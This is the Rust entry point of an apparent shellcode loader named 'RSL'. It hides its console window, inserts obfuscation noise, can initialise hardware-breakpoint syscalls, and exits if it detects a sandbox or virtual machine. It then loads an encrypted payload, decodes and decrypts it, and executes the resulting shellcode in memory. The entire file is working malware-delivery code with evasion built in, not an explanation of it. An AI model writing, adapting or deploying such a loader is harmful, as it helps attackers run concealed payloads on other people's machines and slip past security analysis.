#![cfg_attr(not(feature = "debug"), windows_subsystem = "windows")]
mod alloc;
#[cfg(feature = "with_bundling")]
mod bundle;
mod decode;
mod decrypt;
mod exec;
mod load;
mod ntapi;
#[cfg(feature = "sandbox")]
mod sandbox;
mod syscall;
mod utils;

use decode::decode;
use decrypt::decrypt;
use exec::exec;
use load::load;
use rsl_macros::obfuscation_noise_macro;
#[cfg(feature = "debug")]
use utils::{print_error, print_message};

fn exit_program() -> ! {
    #[cfg(feature = "hw_syscall")]
    unsafe {
        syscall::hw_syscall::deinit_hw_syscalls();
    }
    #[cfg(feature = "debug")]
    print_message("Exiting program.");
    std::process::exit(1);
}

fn start_program() {
    #[cfg(feature = "hw_syscall")]
    unsafe {
        syscall::hw_syscall::init_hw_syscalls();
    }
    obfuscation_noise_macro!();
    #[cfg(feature = "debug")]
    print_message("RSL started in debug mode.");
}
fn main() {
    start_program();

    #[cfg(feature = "sandbox")]
    if sandbox::guard_vm() {
        #[cfg(feature = "debug")]
        print_message("Sandbox/VM detected. Exiting...");
        exit_program();
    } else {
        #[cfg(feature = "debug")]
        print_message("Passed Sandbox/VM detection.");
    }

    #[cfg(feature = "with_bundling")]
    if let Err(_e) = bundle::bundlefile() {
        #[cfg(feature = "debug")]
        print_error("Failed to bundle:", &_e);
        exit_program();
    } else {
        #[cfg(feature = "debug")]
        print_message("Bundling succeeded.");
        obfuscation_noise_macro!();
    }

    let encrypted_data = match load() {
        Ok(data) => {
            #[cfg(feature = "debug")]
            print_message("Payload loaded successfully.");
            obfuscation_noise_macro!();
            data
        }
        Err(_e) => {
            #[cfg(feature = "debug")]
            print_error("Failed to load:", &_e);
            exit_program();
        }
    };

    let decrypted_data = decode(&encrypted_data).unwrap();

    unsafe {
        let (shellcode_ptr, shellcode_len) = match decrypt(&decrypted_data) {
            Ok(p) => {
                #[cfg(feature = "debug")]
                print_message("Payload decrypted successfully.");
                obfuscation_noise_macro!();
                p
            }
            Err(_e) => {
                #[cfg(feature = "debug")]
                print_error("Failed to decrypt:", &_e);
                exit_program();
            }
        };

        if let Err(_e) = exec(shellcode_ptr as usize, shellcode_len) {
            #[cfg(feature = "debug")]
            print_error("Failed to execute:", &_e);
            exit_program();
        }
    }

    exit_program();
}
